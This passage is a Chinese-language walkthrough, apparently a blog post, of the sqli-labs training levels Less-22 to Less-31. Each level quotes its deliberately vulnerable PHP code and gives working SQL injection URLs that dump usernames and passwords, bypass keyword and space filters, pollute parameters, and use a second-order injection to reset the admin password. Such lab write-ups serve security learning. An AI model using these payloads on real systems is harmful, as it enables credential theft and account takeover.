+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$cookee1</span> = <span class="string">&#x27;&quot;&#x27;</span>. <span class="variable">$cookee</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>可以看出仅仅实在Less-21的基础上把闭合方式改为了<code>&quot;$cookee1&quot;</code>，注入方式参考Less-21</p>
+<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> 有查询结果:</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
+<p>可以看出这里使用正则匹配过滤了<code>#</code>和<code>--</code>，导致了我们无法把查询语句中参数<code>$id</code>后面的限制仅输出1个内容给屏蔽掉。这里我们可以构造语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username,&#39;:&#39;,password) from users),&#39;3</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304215528582.png" alt="image-20210304215528582"></p>
+<p>解释：</p>
+<ol>
+<li><p>首先是id的第一个参数为-1，因为 sql 语句执行了两个 select 语句，第一个 select 为 id 的选择语 句，第二个为我们构造的 select 语句。只有一个数据可以输出，为了让我们自己构造的数据 可以正常输出，第一个 select 要没有结果，所以-1 或者超过数据库所有数据都可以。</p>
+</li>
+<li><p>最后3前面的<code>&#39;</code>目的是闭合查询语句最后的<code>&#39;</code>，使其不会错误</p>
+</li>
+<li><p>此处也可以进行报错注入，盲注</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select extractvalue(1,concat(0x7e,(select database()),0x7e))),&#39;3</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304215543764.png" alt="image-20210304215543764"></p>
+<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><ul>
+<li><p>查看代码</p>
+<ul>
+<li><strong>Index.php</strong></li>
+</ul>
+<p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了。</p>
+<p>输入用户名和密码之后会把数据传输到 <strong>login.php</strong> 进行验证。点击忘记密码会跳转到<strong>forgot_password.php</strong>，点击创建新用户会跳转到<strong>new_user.php</strong>。</p>
+<ul>
+<li><strong>failed.php</strong></li>
+</ul>
+<p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p>
+<ul>
+<li><strong>forgot_password.php</strong></li>
+</ul>
+<p>简单提示：如果你忘记密码 请 hack it</p>
+<ul>
+<li><strong>login.php</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 登陆成功：</span><br><span class="line">    <span class="comment">#设置session和cookie</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">    setcookie(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure>
+<p><code>$username</code>和<code>$password</code>两个参数都被过滤掉，无法从这里进行注入。</p>
+<ul>
+<li><strong>new_user.php</strong></li>
+</ul>
+<p>创建新用户的表单页面，本文件主要存放前段代码。</p>
+<ul>
+<li><strong>login_create.php</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span></span><br><span class="line"><span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前用户信息</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">#如果当前用户已经存在 无法注册</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 两次输入密码一致：</span><br><span class="line">  <span class="comment"># 将记录插入数据库中</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br><span class="line">      查询完成后 重定向到首页</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        提示两次输入密码不一致</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>pass_change.php</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 检测未登录：</span><br><span class="line">    重定向到首页</span><br><span class="line"><span class="keyword">if</span> 检测到提交表单：</span><br><span class="line">  <span class="comment"># 对 pass 都进行了过滤</span></span><br><span class="line">  <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 两次密码一致:</span><br><span class="line">        <span class="comment"># 直接将 username 拼接到 SQL 语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        提示密码不一致 并重定向到 fail.php</span><br></pre></td></tr></table></figure></li>
+<li><p>思路分析</p>
+</li>
+</ul>
+<p>这里需要利用到二次注入。看更新密码的地方：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span><span class="comment"># and password=&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>相当于<code>#</code>后面的都被屏蔽掉了，直接修改了 admin 的用户密码。</p>
+<ul>
+<li><p>演示步骤</p>
+<ol>
+<li><p>注册一个名字为<code>admin&#39;#</code>的用户</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100428917.png" alt="image-20210305100428917"></p>
+</li>
+<li><p>注册好之后登陆该账户，对密码进行修改</p>
+</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100925703.png" alt="image-20210305100925703"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100819324.png" alt="image-20210305100819324"></p>
+</li>
+</ul>
+<p>可以看到此时admin用户的密码被修改为了000</p>
+<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><ul>
+<li>查看代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>= blacklist(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>  可以看出后端把传进去的参数进行了过滤，把<code>or</code>和<code>and</code>不区分大小写替换为了空字符。</p>
+<ul>
+<li>or 和 and 过滤的绕过<ol>
+<li>大小写变形 Or,OR,oR</li>
+<li>编码，hex，urlencode</li>
+<li>添加注释/*or*/</li>
+<li>利用符号 and=&amp;&amp; or=||</li>
+<li>双写 oorr，anandd</li>
+</ol>
+</li>
+</ul>
+<p>由于password中含有or，所以要在里面双写</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username,&#39;:&#39;,passwoorrd) from users),3--+</span><br></pre></td></tr></table></figure>
+<p>使用报错或者盲注时推荐使用符号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;||extractvalue(1,concat(0x7e,database()))--+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>值得一提的是，如果使用&amp;&amp;来代替and，需要对&amp;&amp;进行url编码，否则&amp;后面的内容会被当成第二个参数传递。</p>
+</blockquote>
+<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>这一关就是Less-25的小改，参数类型改为了数字型，并且屏蔽了错误信息显示。因此这里只能使用联合注入和盲注。</p>
+<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  这里过滤规则变多了，把 or，and，/*，#，–，/和空格给过滤掉 </p>
+<ul>
+<li><p>绕过方法</p>
+<ul>
+<li>之前已经提过and，or和注释符被过滤时候的绕过方法，这里不再赘述</li>
+<li>空格被过滤可以使用如下的符号来代替</li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">符号</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">%09</td>
+<td align="left">TAB 键(水平)</td>
+</tr>
+<tr>
+<td align="left">%0a</td>
+<td align="left">新建一行</td>
+</tr>
+<tr>
+<td align="left">%0c</td>
+<td align="left">新的一页</td>
+</tr>
+<tr>
+<td align="left">%0d</td>
+<td align="left">return 功能</td>
+</tr>
+<tr>
+<td align="left">%0b</td>
+<td align="left">TAB 键(垂直)</td>
+</tr>
+<tr>
+<td align="left">%a0</td>
+<td align="left">空格</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ea678630a8ac651042f1a6ce703956a2.n2.vsgo.cloud:14562&#x2F;sqlilabs&#x2F;Less-26&#x2F;</span><br><span class="line">?id&#x3D;100&#39;%0bunion%0bselect%0b1,(select%0bgroup_concat(username,&#39;:&#39;,passwoorrd)%0bfrom%0busers),3||&#39;1</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>该方法无法再window上实现，因为有些符号不能被解析,这里借助了在线容器进行测试</p>
+<p><a class="link"   href="https://www.vsplate.com/labs.php" >https://www.vsplate.com/labs.php<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>与 Less-26 相比，只是拼接方式改为了<code>(&#39;$id&#39;)</code>，因为没有输出报错信息，所以不能使用报错注入了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ea678630a8ac651042f1a6ce703956a2.n2.vsgo.cloud:14562&#x2F;sqlilabs&#x2F;Less-26a&#x2F;</span><br><span class="line">?id&#x3D;100&#39;)%0bunion%0bselect%0b1,(select%0bgroup_concat(username,&#39;:&#39;,passwoorrd)%0bfrom%0busers),3||(&#39;1</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br></pre></td></tr></table></figure>
+<p>这里解释一下正则匹配修饰符的含义：</p>
+<table>
+<thead>
+<tr>
+<th>模式修正符号</th>
+<th>功能描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>i</td>
+<td>在和正则匹配是不区分大小写</td>
+</tr>
+<tr>
+<td>m</td>
+<td>将字符串视为多行。(具体作用就是防止双写绕过)</td>
+</tr>
+<tr>
+<td>s</td>
+<td>如果设定了这个修正符，那么，被匹配的字符串将视为一行来看，包括换行符，换行符将被视为普通字符串。</td>
+</tr>
+</tbody></table>
+<p>通过源码我们知道了后端对那些字符进行了过滤，虽然这里对<code>union</code>和<code>select</code>做了部分过滤，但是任然存在可以绕过的漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-27&#x2F;</span><br><span class="line">?id&#x3D;100&#39;unIon%0bSelEcT%0b1,database(),&#39;3</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>这关在Less-27的基础上，把闭合方式改为<code>&quot;$id&quot;</code>，同时屏蔽了错误信息显示，因此无法进行报错注入。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-27a&#x2F;</span><br><span class="line">?id&#x3D;100&quot;unIon%0bSelEcT%0b1,database(),&quot;3</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br></pre></td></tr></table></figure>
+<p>闭合方式为<code>(&#39;$id&#39;)</code>，，并且取消了select不能双写的限制，增加了对<code>union select</code>连在一起的时候且不区分大小写的过滤，且屏蔽了错误信息显示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-28&#x2F;</span><br><span class="line">?id&#x3D;100&#39;)uniunion%0bselecton%0bselect%0b1,database(),(&#39;3</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>本关在less-28的基础上竟然还少了前面的几个限制，只留下了最后一个对<code>union select</code>的过滤</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-28a&#x2F;</span><br><span class="line">?id&#x3D;100&#39;) uniunion selecton select 1,database(),(&#39;3</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><ul>
+<li><p>查看源码</p>
+<ul>
+<li>index.php</li>
+</ul>
+<p>并没有什么特别的，平平无奇，使用联合注入即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-29&#x2F;</span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>login.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="variable">$id1</span>=java_implimentation(<span class="variable">$qs</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//echo $id1;</span></span><br><span class="line">whitelist(<span class="variable">$id1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里面有2个函数，<strong>java_implimentation</strong>的作用是将传入的参数以<code>&amp;</code>分隔，如果该参数的前两个字符为<code>id</code>，则取它的第三个字符开始的30个字符作为<code>$id_value</code>，并返回<code>$id_value</code>，同时跳出循环。<strong>whitelist</strong>的作用是检查传入的字符串是否是数字，是的话就直接返回该字符串，否则就跳转到hacked.php。</p>
+</li>
+<li><p>利用方式</p>
+</li>
+</ul>
+<p>由于<strong>java_implimentation</strong>函数只要检测到一个<code>id</code>参数就退出检测，那么当我们传入2个名为<code>id</code>的参数时，后面的那一个就能绕过检测，从而可以利用其来进行注入。那么问题是，我们后端使用<code>$id=$_GET[&#39;id&#39;];</code>获取到的<code>id</code>参数究竟是第一个还是第二个呢。假设用户输入这样的语句：</p>
+  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?id=<span class="number">1</span>&amp;id=<span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>  Apache PHP 会解析最后一个参数</p>
+<p>  Tomcat JSP 会解析第一个参数</p>
+<p>可以看出，我们可以构造第二个<code>id</code>参数来绕过检测。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>和Less-29相比，index.php页面的错误信息显示被屏蔽了，闭合方式改为<code>&quot;$id&quot;</code>，其他照旧。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>和Less-29相比，闭合方式改为<code>(&quot;$id&quot;)</code>，其他不变。</p>
